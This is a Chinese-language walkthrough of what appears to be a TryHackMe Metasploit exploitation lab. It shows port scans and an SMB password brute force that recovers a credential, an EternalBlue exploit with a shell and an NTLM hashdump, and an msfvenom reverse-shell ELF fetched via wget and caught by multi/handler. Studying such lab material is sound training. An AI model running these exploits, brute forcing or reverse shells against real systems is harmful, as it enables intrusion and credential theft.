# Metasploit：利用


## task 1

```
如何使用 Metasploit 掃描目標系統。
如何使用 Metasploit 數據庫功能。
如何使用 Metasploit 進行漏洞掃描。
如何使用 Metasploit 在目標系統上利用易受攻擊的服務。
如何msfvenom用於在目標系統上創建有效負載並獲取 Meterpreter 會話。
```

## task2 
### scanning

`auxiliary`

## port scan

search portscan

```
msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator


```

1.    5 
```
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 10.10.255.118:        - 10.10.255.118:22 - TCP OPEN
[+] 10.10.255.118:        - 10.10.255.118:21 - TCP OPEN
[+] 10.10.255.118:        - 10.10.255.118:139 - TCP OPEN
[+] 10.10.255.118:        - 10.10.255.118:445 - TCP OPEN
[+] 10.10.255.118:        - 10.10.255.118:8000 - TCP OPEN
[*] 10.10.255.118:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```


2.
```
msf6 auxiliary(scanner/netbios/nbname) > run

[*] Sending NetBIOS requests to 10.10.255.118->10.10.255.118 (1 hosts)
[+] 10.10.255.118 [IP-10-10-255-11] OS:Unix Names:(ACME IT SUPPORT, IP-10-10-255-11) Addresses:(10.10.255.118) Mac:00:00:00:00:00:00 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


```


3.
```
msf6 auxiliary(scanner/http/http_version) > set rport 8000
rport => 8000
msf6 auxiliary(scanner/http/http_version) > run

[+] 10.10.255.118:8000 webfs/1.21 ( 403-Forbidden )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```


4.
```
msf6 > use scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.10.255.118
rhosts => 10.10.255.118
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /home/kali/Downloads/MetasploitWordlist.txt
PASS_FILE => /home/kali/Downloads/MetasploitWordlist.txt
msf6 auxiliary(scanner/smb/smb_login) > set SMBuser penny
SMBuser => penny
msf6 auxiliary(scanner/smb/smb_login) > run



[-] 10.10.255.118:445     - 10.10.255.118:445 - Failed: '.\penny:goat',
[-] 10.10.255.118:445     - 10.10.255.118:445 - Failed: '.\penny:god',
[-] 10.10.255.118:445     - 10.10.255.118:445 - Failed: '.\penny:guessme',
[-] 10.10.255.118:445     - 10.10.255.118:445 - Failed: '.\penny:hugs',
[-] 10.10.255.118:445     - 10.10.255.118:445 - Failed: '.\penny:letmein',
[+] 10.10.255.118:445     - 10.10.255.118:445 - Success: '.\penny:leo1234'
[*] 10.10.255.118:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


```

## task3

### Metasploit 數據庫
#### 數據庫功能，可簡化項目管理並避免在設置參數值時可能出現的混淆

您首先需要啟動 PostgreSQL 數據庫，Metasploit 將通過以下命令使用該數據庫： 

`systemctl start postgresql`

使用`msfdb init`命令初始化 Metasploit 數據庫。 

啟動msfconsole並檢查數據庫狀態。db_status    

數據庫功能將允許您創建工作區以隔離不同的項目。首次啟動時，您應該在默認工作區中。 您可以使用該命令 列出可用的工作空間。workspace      


使用參數添加工作區-a或使用參數刪除工作區-d。下面的屏幕截圖顯示創建了一個名為“tryhackme”的新工作區。
```
msf6 > workspace -a test
[*] Added workspace: test
[*] Workspace: test
msf6 > workspace 
  default
* test
msf6 > workspace default 
[*] Workspace: default
msf6 > workspace 
  test
* default
msf6 > 

```

## tsak4

`search`
可以info 對任何模塊使用該命令，以更好地了解其用途和用途    

```

msf6 auxiliary(scanner/vnc/vnc_login) > use 23
msf6 auxiliary(scanner/smtp/smtp_relay) > info

       Name: SMTP Open Relay Detection
     Module: auxiliary/scanner/smtp/smtp_relay
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Campbell Murray
  xistence <xistence@0x90.nl>

```
## task5

search 漏洞    
info  獲取有關該漏洞利用的更多信息     

成功的結果取決於對目標系統上運行的服務的透徹理解     


漏洞利用都會有一個預設的默認負載     
可以使用show payloads命令列出可用於該特定漏洞的其他命令。      
確定有效負載後，您可以使用set payload     
show options 顯示需要設置的新參數     
使用後台CTRL+Z或使用 中止它CTRL+C      

##  使用會話
`sessions`  列出所有活動會話,支持許多選項，可幫助您更好地管理會話。   
-h help      
sessions -i 可以使用後跟會話 ID的命令與任何現有會話進行交互      
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RhoSTS 10.10.182.247
RhoSTS => 10.10.182.247
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.9.1.50 
lhost => 10.9.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

meterpreter > search -f flag.txt
Found 1 result...
=================

Path                             Size (bytes)  Modified (UTC)
----                             ------------  --------------
c:\Users\Jon\Documents\flag.txt  15            2021-07-14 22:39:25 -0400

meterpreter > cat c:\Users\Jon\Documents\flag.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > shell 
Process 2480 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>type c:\Users\Jon\Documents\flag.txt
type c:\Users\Jon\Documents\flag.txt
THM-5455554845



meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::

```
## task6

### msfvenom
`msfvenom -l payload`
Framework Payloads (592 total) [--payload <value>]

### 輸出格式
`msfvenom --list formats`命令可用於列出支持的輸出格式

```
1. msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

2. python3 http.server

3.傳輸到目標機器 use wget

4. chmod +x and run the elf

5.
msf6 exploit(multi/handler) > set lport 9999
lport => 9999

msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.1.50:9999 
[*] Sending stage (984904 bytes) to 10.10.209.159
[*] Meterpreter session 5 opened (10.9.1.50:9999 -> 10.10.209.159:47226 ) at 2022-01-20 10:09:07 -0500

* 使用後期利用模塊轉儲系統上其他用戶的哈希值

可以用 background 把當前session丟到背景

這時候用sessios 指令能看見他

接著use post/linux/gather/hashdump

然後show options 

set session id

run


```

